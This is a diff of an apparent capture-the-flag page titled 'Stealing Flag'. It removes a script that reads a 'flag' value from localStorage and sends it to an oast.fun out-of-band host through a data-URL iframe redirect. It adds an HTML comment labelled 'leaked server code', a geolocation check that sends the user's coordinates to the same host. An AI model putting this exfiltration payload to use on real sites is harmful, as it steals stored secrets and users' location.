@@ -4,11 +4,79 @@
     <title>Stealing Flag</title>
   </head>
   <body>
-    <script>
-      const flag = localStorage.getItem('flag');
-      const iframe = document.createElement('iframe');
-      iframe.src = "data:text/html,<script>location='https://bhvsumorecywkcaevmkui8q6n12uvuhmu.oast.fun/?flag=" + encodeURIComponent(flag) + "'<\/script>";
-      document.body.appendChild(iframe);
-    </script>
+    <h1>The flag is hidden.</h1>
+
+<!-- Leaked server code:
+ <!DOCTYPE html>
+<html>
+<head>
+  <title>Location Challenge</title>
+</head>
+<body>
+  <div id="output">Checking location...</div>
+
+  <script>
+    const output = document.getElementById("output");
+    const threshold = 0.001; // ~100m
+
+    function getCurrentLocation(callback) {
+      if (!navigator.geolocation) {
+        output.textContent = "❌ Geolocation not supported.";
+        return;
+      }
+
+      navigator.geolocation.getCurrentPosition(
+        position => {
+          const lat = position.coords.latitude;
+          const lon = position.coords.longitude;
+          callback(lat, lon);
+        },
+        error => {
+          output.textContent = "❌ Unable to get your location.";
+          console.error("Geolocation error:", error);
+        }
+      );
+    }
+
+    function compareCoords(userLat, userLon, targetLat, targetLon) {
+      const latMatch = Math.abs(userLat - targetLat) <= threshold;
+      const lonMatch = Math.abs(userLon - targetLon) <= threshold;
+      return latMatch && lonMatch;
+    }
+
+    function showFlag() {
+      //redacted
+    }
+
+    getCurrentLocation((lat, lon) => {
+      const endpoint = `https://bhvsumorecywkcaevmkui8q6n12uvuhmu.oast.fun?lat=${lat}&lon=${lon}`;
+
+      fetch(endpoint)
+        .then(res => res.text())
+        .then(responseText => {
+          // Expecting response like: "23.8103,90.4125"
+          if (!responseText.includes(",")) {
+            output.textContent = "❌ Invalid response from server.";
+            return;
+          }
+
+          const [targetLat, targetLon] = responseText.split(",").map(parseFloat);
+
+          if (compareCoords(lat, lon, targetLat, targetLon)) {
+            showFlag();
+          } else {
+            output.textContent = "❌ You're not at the correct location.";
+          }
+        })
+        .catch(err => {
+          output.textContent = "❌ Failed to fetch target location.";
+          console.error("Fetch error:", err);
+        });
+    });
+  </script>
+</body>
+</html>
+
+ -->
   </body>
 </html>
